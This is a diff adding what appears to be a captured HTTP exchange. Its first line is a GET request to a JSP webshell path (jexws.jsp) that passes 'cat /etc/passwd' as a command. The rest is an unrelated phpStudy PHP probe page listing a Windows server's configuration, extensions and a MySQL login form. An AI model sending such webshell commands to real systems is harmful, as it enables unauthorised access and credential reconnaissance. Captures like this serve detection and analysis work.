@@ -1,0 +1,355 @@
+GET /pte/jexws/jexws.jsp?ppp=cat+%2Fetc%2Fpasswd HTTP/1.1
+Host: 192.168.203.178
+User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+
+
+
+	  <td></td>
+	  <td>DESKTOP-0E6SVBJ</td>
+	  <td></td>
+	  <td>C:/phpstudy_pro/WWW</td>
+	</tr>
+  <tr>
+	  <td></td>
+	  <td>admin@example.com</td>
+		<td></td>
+		<td>C:/phpstudy_pro/WWW/index.php</td>
+	</tr>
+</table>
+
+
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr>
+    <th colspan="4">PHP</th>
+  </tr>
+  <tr>
+    <td colspan="4"><span class="w_small">
+Core&nbsp;&nbsp;bcmath&nbsp;&nbsp;calendar&nbsp;&nbsp;ctype&nbsp;&nbsp;date&nbsp;&nbsp;ereg&nbsp;&nbsp;filter&nbsp;&nbsp;ftp&nbsp;&nbsp;hash&nbsp;&nbsp;iconv&nbsp;&nbsp;json&nbsp;&nbsp;mcrypt&nbsp;&nbsp;SPL&nbsp;&nbsp;<br />odbc&nbsp;&nbsp;pcre&nbsp;&nbsp;Reflection&nbsp;&nbsp;session&nbsp;&nbsp;standard&nbsp;&nbsp;mysqlnd&nbsp;&nbsp;tokenizer&nbsp;&nbsp;zip&nbsp;&nbsp;zlib&nbsp;&nbsp;libxml&nbsp;&nbsp;dom&nbsp;&nbsp;PDO&nbsp;&nbsp;openssl&nbsp;&nbsp;<br />SimpleXML&nbsp;&nbsp;wddx&nbsp;&nbsp;xml&nbsp;&nbsp;xmlreader&nbsp;&nbsp;xmlwriter&nbsp;&nbsp;cgi-fcgi&nbsp;&nbsp;curl&nbsp;&nbsp;fileinfo&nbsp;&nbsp;gd&nbsp;&nbsp;mbstring&nbsp;&nbsp;mysql&nbsp;&nbsp;mysqli&nbsp;&nbsp;Phar&nbsp;&nbsp;<br />pdo_mysql&nbsp;&nbsp;pdo_sqlite&nbsp;&nbsp;mhash&nbsp;&nbsp;</span>
+    </td>
+  </tr>
+</table>
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr><th colspan="4">PHP</th></tr>
+  <tr>
+    <td width="32%">PHPphpinfo</td>
+    
+
+
+<td width="18%">
+		    <a href='/index.php?act=phpinfo' target='_blank'>PHPINFO</a>    </td>
+    <td width="32%">PHPphp_version</td>
+    <td width="18%">5.6.9</td>
+  </tr>
+  <tr>
+    <td>PHP</td>
+    <td>CGI-FCGI</td>
+    <td>memory_limit</td>
+    <td>256M</td>
+  </tr>
+  <tr>
+    <td>PHPsafe_mode</td>
+    <td><font color="red"></font></td>
+    <td>POSTpost_max_size</td>
+    <td>100M</td>
+  </tr>
+  <tr>
+    <td>upload_max_filesize</td>
+    <td>100M</td>
+    <td>precision</td>
+    <td>14</td>
+  </tr>
+  <tr>
+    <td>max_execution_time</td>
+    <td>300</td>
+    <td>socketdefault_socket_timeout</td>
+    <td>60</td>
+  </tr>
+  <tr>
+    <td>PHPdoc_root</td>
+    <td><font color="red"></font></td>
+    <td>user_dir</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>dl()enable_dl</td>
+    <td><font color="red"></font></td>
+    <td>include_path</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>display_errors</td>
+    <td><font color="green"></font></td>
+    <td>register_gl
+
+
+obals</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>magic_quotes_gpc</td>
+    <td><font color="red"></font></td>
+    <td>"&lt;?...?&gt;"short_open_tag</td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>"&lt;% %&gt;"ASPasp_tags</td>
+    <td><font color="red"></font></td>
+    <td>ignore_repeated_errors</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>ignore_repeated_source</td>
+    <td><font color="red"></font></td>
+    <td>report_memleaks</td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>magic_quotes_gpc</td>
+    <td><font color="red"></font></td>
+    <td>magic_quotes_runtime</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>allow_url_fopen</td>
+    <td><font color="green"></font></td>
+    <td>argvargcregister_argc_argv</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>Cookie </td>
+    <td><font color="green"></font></td>
+    <td>ASpell Library</td>
+    <td><font color="red"></font></td>
+  </tr>
+   <tr>
+    <td>BCMath</td>
+
+
+
+    <td><font color="green"></font></td>
+    <td>PRELPCRE</td>
+    <td><font color="green"></font></td>
+   <tr>
+    <td>PDF</td>
+    <td><font color="red"></font></td>
+    <td>SNMP</td>
+    <td><font color="red"></font></td>
+  </tr> 
+   <tr>
+    <td>VMailMgr</td>
+    <td><font color="red"></font></td>
+    <td>Curl</td>
+    <td><font color="green"></font></td>
+  </tr> 
+   <tr>
+    <td>SMTP</td>
+    <td><font color="green"></font></td>
+    <td>SMTP</td>
+    <td>localhost</td>
+  </tr> 
+	<tr>
+		<td>enable_functions</td>
+		<td colspan="3"><a href='/index.php?act=Function' target='_blank' class='static'></a></td>		
+	</tr>
+	<tr>
+		<td>disable_functions</td>
+		<td colspan="3" class="word">
+<font color=red></font>		</td>
+	</tr>
+</table>
+<!---->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr><th colspan="4" ></th></tr>
+  <tr>
+    <td width="32%">FTP</td>
+    <td width="18%"><font color="green"></font></td>
+    <td width="32%">XML</td>
+    <td width="18%"><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>Session</td>
+    <td><font color="green"></font></td>
+    <td>Socket</td>
+    <td><font color="re
+
+
+d"></font></td>
+  </tr>
+  <tr>
+    <td>Calendar</td>
+    <td><font color="green"></font>	</td>
+    <td>URL</td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>GD</td>
+    <td>
+    bundled (2.1.0 compatible)</td>
+    <td>(Zlib)</td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>IMAP</td>
+    <td><font color="red"></font></td>
+    <td></td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td></td>
+    <td><font color="green"></font></td>
+    <td>WDDX</td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>Iconv</td>
+    <td><font color="green"></font></td>
+    <td>mbstring</td>
+    <td><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td></td>
+    <td><font color="green"></font></td>
+    <td>LDAP</td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>MCrypt</td>
+    <td><font color="green"></font></td>
+    <td></td>
+    <td><font color="green"></font></td>
+  </tr>
+</table>
+
+<!---->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr><th colspan="4" ></th></tr>
+  <tr>
+    <td width="32%">
+
+
+Zend</td>
+    <td width="18%">2.6.0</td>
+    <td width="32%">
+ZendGuardLoader[]	</td>
+    <td width="18%"><font color=red></font></td>
+  </tr>
+  <tr>
+    <td>eAccelerator</td>
+    <td><font color=red></font></td>
+    <td>ioncube</td>
+    <td><font color=red></font></td>
+  </tr>
+  <tr>
+    <td>XCache</td>
+    <td><font color=red></font></td>
+    <td>APC</td>
+    <td><font color=red></font></td>
+  </tr>
+</table>
+
+<!---->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr><th colspan="4"></th></tr>
+  <tr>
+    <td width="32%">MySQL </td>
+    <td width="18%"><font color="green"></font>    	</td>
+    <td width="32%">ODBC </td>
+    <td width="18%"><font color="green"></font></td>
+  </tr>
+  <tr>
+    <td>Oracle </td>
+    <td><font color="red"></font></td>
+    <td>SQL Server </td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>dBASE </td>
+    <td><font color="red"></font></td>
+    <td>mSQL </td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>SQLite </td>
+    <td><font color="red"></font></td>
+    <td>Hyperwave </td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>Postgre SQL </td>
+    <td><font color="red"></font></td>
+    <td>Informix </td>
+
+
+
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>DBA </td>
+    <td><font color="red"></font></td>
+    <td>DBM </td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>FilePro </td>
+    <td><font color="red"></font></td>
+    <td>SyBase </td>
+    <td><font color="red"></font></td>
+  </tr> 
+</table>
+
+<form action="/index.php#bottom" method="post">
+<!--MySQL-->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+	<tr><th colspan="3">MySQL</th></tr>
+  <tr>
+    <td width="15%"></td>
+    <td width="60%">
+      <input type="text" name="host" value="localhost" size="10" />
+      <input type="text" name="port" value="3306" size="10" />
+      <input type="text" name="login" size="10" />
+      <input type="password" name="password" size="10" />
+    </td>
+    <td width="25%">
+      <input class="btn" type="submit" name="act" value="MySQL" />
+    </td>
+  </tr>
+</table>
+  <!---->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+	<tr><th colspan="3"></th></tr>
+  <tr>
+    <td width="15%"></td>
+    <td width="60%">
+      
+      <input type="text" name="funName" size="50" />
+    </td>
+    <td width="25%">
+      <input class="btn" type="submit" name="act" al
+
+
+ign="right" value="" />
+    </td>
+  </tr>
+  </table>
+
+</form>
+
+<div id="footer">
+<p>phpStudyApache+Nginx+IIS+Lighttpd+PHP+MySQL+phpMyAdmin+SQL-Front+Zend LoaderPHPPHPPHPWINDOWS
+ <a href="http://www.phpstudy.net/" target="_blank">www.phpstudy.net</a></p>
+</div>
+
+</div>
+</body>
+</html>
+0
+
+
+
+
